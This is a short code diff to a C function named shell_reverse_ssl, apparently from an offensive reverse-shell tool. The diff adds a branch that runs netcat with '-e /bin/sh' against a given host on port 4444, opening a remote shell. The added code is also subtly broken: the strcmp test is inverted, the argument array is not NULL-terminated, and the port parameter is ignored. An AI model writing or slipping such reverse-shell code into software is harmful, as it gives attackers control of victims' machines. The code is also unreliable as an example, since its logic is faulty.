@@ -90,6 +90,17 @@ bool shell_reverse_ssl(char *host, int host_port, char *type){
     execve("/bin/bash",
            (char *[]){"bin/bash", 0},
            environ);
+  } else if (strcmp(type, "netcat")){
+    char *args_netcat[] = {
+      "/usr/bin/nc",
+      "-e",
+      "/bin/sh",
+      host,
+      "4444"
+    };
+    execve(args_netcat[0],
+           &args_netcat[0],
+           environ);
   } else{
     fprintf(stderr, "error: reverse shell type is unsupported");
     return false;
